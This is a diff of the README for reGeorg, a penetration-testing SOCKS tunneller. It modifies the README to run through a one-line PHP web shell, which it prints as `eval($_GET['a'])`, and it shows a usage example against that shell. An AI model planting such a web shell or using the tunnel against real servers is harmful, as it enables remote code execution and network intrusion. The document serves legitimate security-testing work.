@@ -1,4 +1,4 @@
-reGeorg
+reGeorg for PHP Shell
 =========
 
 ```                    _____
@@ -14,6 +14,14 @@ willem@sensepost.com / [@\_w\_m\_\_]
 sam@sensepost.com / [@trowalts]
 
 etienne@sensepost.com / [@kamp_staaldraad]
+
+
+What's this?
+----
+A modified reGeorg for One-line PHP Shell like this:
+```php
+<?php eval($_GET['a']); ?>
+```
 
 
 Version
@@ -33,7 +41,7 @@ Usage
 --------------
 
 ```
-$ reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u  [-v]
+$ reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u -k [-v] 
 
 Socks server for reGeorg HTTP(s) tunneller
 
@@ -43,29 +51,13 @@ optional arguments:
   -p , --listen-port   The default listening port
   -r , --read-buff     Local read buffer, max data to be sent per POST
   -u , --url           The url containing the tunnel script
+  -k , --key           The GET paramter
   -v , --verbose       Verbose output[INFO|DEBUG]
-
-```
-
-* **Step 1.**
-Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to
-you)
-
-* **Step 2.**
-Configure you tools to use a socks proxy, use the ip address and port you
-specified when
-you started the reGeorgSocksProxy.py
-
-** Note, if you tools, such as NMap doesn't support socks proxies, use
-[proxychains] (see wiki) 
-
-* **Step 3.** Hack the planet :)
-
 
 Example
 ---------
 ```
-$ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
+$ python reGeorgSocksProxy.py -p 8080 -u http://127.0.0.1/shell.php -k a
 ```
 
 License
